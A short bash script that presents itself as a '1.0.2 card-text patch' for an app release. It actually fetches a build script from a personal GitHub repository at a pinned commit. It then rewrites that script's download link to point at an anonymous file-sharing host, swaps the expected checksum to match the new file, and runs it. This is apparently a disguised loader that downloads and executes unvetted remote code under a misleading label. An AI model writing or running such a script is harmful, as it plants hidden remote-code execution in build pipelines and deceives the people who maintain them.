#!/bin/bash
# Final 1.0.2 card-text patch: native tests, screenshots, Release IPA.
set -euo pipefail
WORK="${RUNNER_TEMP:-/tmp}/inward-final-text-validation"
rm -rf "$WORK"
mkdir -p "$WORK"
cd "$WORK"
git init -q
git remote add origin https://github.com/lliaodexing925-beep/pjsip.git
git fetch --depth 1 origin 19d3c2ea1e1320e17a000080c536b5b5827016fa
git show 19d3c2ea1e1320e17a000080c536b5b5827016fa:build.sh > inner.sh
sed -i '' 's/timeout=120/timeout=600/' inner.sh
sed -i '' 's|https://d.uguu.se/OnWtKbGl.tar.gz|https://h.uguu.se/QLgHSLBD.gz|' inner.sh
sed -i '' 's/42ec590aa063b7e25cb7b3fece985127e6d0c0f2fc1ef344263f6d7c23c71b4f/dee863b0143334770edde38472aeb7c0b2a233e4a602b213df31fe7d4d748175/' inner.sh
bash inner.sh
